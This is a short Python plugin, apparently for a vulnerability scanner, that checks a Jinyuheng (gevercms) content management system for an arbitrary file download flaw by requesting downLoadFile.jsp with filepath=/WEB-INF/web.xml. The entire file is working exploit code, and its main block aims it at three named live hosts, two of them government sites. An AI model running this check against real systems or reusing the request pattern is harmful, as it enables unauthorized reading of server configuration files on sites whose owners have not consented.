#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:   金宇恒内容管理系统通用型任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-069009

def assign(service,arg):
    if service=="gevercms":
        return True,arg 


def  audit(arg):
    url=arg+'adminroot/common/downLoadFile.jsp?filepath=/WEB-INF/web.xml&filename=None'
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<servlet-mapping>" in res:
        security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('gevercms','http://txjy.dg.gov.cn/')[1])
    audit(assign('gevercms','http://xqjy.taicang.gov.cn/')[1])
    audit(assign('gevercms','http://112.91.85.218/')[1])